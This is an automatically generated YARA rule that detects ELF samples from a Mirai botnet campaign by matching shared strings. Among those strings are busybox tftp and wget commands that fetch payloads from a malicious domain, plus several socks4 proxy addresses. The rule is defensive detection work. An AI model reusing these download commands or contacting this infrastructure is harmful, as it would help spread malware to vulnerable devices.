rule Sightlines_tlsh_33f4ad15_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-33f4ad15"
        date = "2026-10-17"
        campaign = "tlsh-33f4ad15"
        family = "mirai"
        hash = "6734ea28fe619758e55f8562600c83175297e912899e5bac7c0b8c38cb0fed20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-33f4ad15.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
